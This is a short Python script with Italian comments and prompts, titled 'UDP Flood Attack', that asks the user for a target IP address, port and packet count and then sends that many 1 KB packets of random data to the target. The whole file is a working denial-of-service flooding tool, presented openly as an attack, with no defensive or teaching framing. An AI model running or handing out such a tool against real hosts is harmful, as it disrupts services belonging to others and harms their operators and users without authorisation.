import socket
import random
import time

# Titolo del programma
print("\n" + "*" * 30)
print("       UDP Flood Attack       ")
print("*" * 30 + "\n")

# Indirizzo IP della macchina target
target_ip = input("Inserisci l'indirizzo IP della macchina target: ")

# Porta UDP della macchina target
target_port = int(input("\nInserisci la porta UDP della macchina target (es: 8080): "))

# Numero di pacchetti da inviare
num_packets = int(input("\nInserisci il numero di pacchetti da inviare: "))

# Creazione del socket UDP
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM) # (IPV4, socket UDP)

# Creazione del pacchetto di 1KB (1024 byte) di dati casuali
data = random.randbytes(1024)

time.sleep(1)

# Riepilogo dati inseriti
print("\n" + "-" * 50)
print(f" Inizio attacco UDP flood verso {target_ip}:{target_port} ")
print(f" Dimensione pacchetto: 1024 byte (1 KB) ")
print(f" Numero di pacchetti da inviare: {num_packets} ")
print("-" * 50 + "\n")
time.sleep(1)

# Invio dei pacchetti
packets_sent = 0
for i in range(num_packets):
    try:
        sock.sendto(data, (target_ip, target_port))
        packets_sent += 1
    except Exception as e:
        print(f"\nErrore durante l'invio del pacchetto {packets_sent + 1}: {e}")

# Chiusura del socket
sock.close()

# Messaggio finale
print("\n" + "=" * 50)
print(f"            Attacco completato \n\n {packets_sent}/{num_packets} pacchetti inviati correttamente    ")
print("=" * 50 + "\n")
